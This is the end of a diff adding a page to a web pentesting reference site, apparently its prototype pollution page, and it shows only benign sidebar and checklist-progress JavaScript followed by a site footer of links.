+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'prototype-pollution-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+const sidebarNav = document.getElementById('sidebar');
+const methodLink = document.createElement('a');
+methodLink.href = '#methodology';
+methodLink.textContent = '📅 Workflow Placement';
+document.querySelectorAll('[id]:not(sidebar):not(main)').forEach(el => {
+  if (el.tagName.match(/^H[1-6]$/)) {
+    const a = document.createElement('a');
+    a.href = '#' + el.id;
+    a.textContent = el.textContent;
+    if (el.id === 'analogy') {
+      sidebarNav.appendChild(a);
+      sidebarNav.appendChild(methodLink);
+    } else {
+      sidebarNav.appendChild(a);
+    }
+  }
+});
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
